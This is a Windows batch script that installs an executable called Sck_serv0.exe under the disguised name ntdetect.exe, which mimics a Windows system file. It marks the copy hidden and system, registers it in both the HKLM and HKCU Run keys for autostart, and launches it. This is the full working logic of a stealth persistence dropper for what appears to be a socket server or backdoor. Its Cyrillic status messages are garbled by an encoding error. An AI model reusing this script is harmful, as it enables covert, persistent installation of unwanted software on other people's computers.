@echo off

set source_name=Sck_serv0.exe

if -%1 == - goto setdir
   set instdir=%1
if -%2 == - goto setname
   set instname=%2
goto startsetup

:setdir
   set instdir=c:
   set /p instdir=���� ��� ��⠭���� (���ਬ�� "%instdir%"): 
:setname
   set instname=ntdetect.exe
   set /p instname=��� 䠩�� (���ਬ�� "%instname%"): 
:startsetup

@echo.
@echo /////////////////////////////////
@echo / ����஢���� � 楫���� ��⠫�� /
@echo /////////////////////////////////
@echo.

copy /Y %source_name% %instdir%\%instname%

@echo.
@echo /////////////////////////////////
@echo /    ��⠭���� ���ਡ�⮢       /
@echo /////////////////////////////////
@echo.

attrib +r %instdir%\%instname%
attrib +h +s %instdir%\%instname%

@echo.
@echo /////////////////////////////////
@echo / ���������� � ��⮧���� HKLM  /
@echo /////////////////////////////////
@echo.

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f /v %instname% /t REG_SZ /d %instdir%\%instname%

@echo.
@echo /////////////////////////////////
@echo / ���������� � ��⮧���� HKCU  /
@echo /////////////////////////////////
@echo.

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %instname% /t REG_SZ /d %instdir%\%instname%

@echo.
@echo /////////////////////////////////
@echo /     �஡�� ��������....      /
@echo /////////////////////////////////
@echo.

start %instname% %instdir%\%instname%

@echo.
@echo /////////////////////////////////
@echo /     ��⠭���� ����祭�        /
@echo /////////////////////////////////
@echo.

set instdir=
set instname=
set source_name=

pause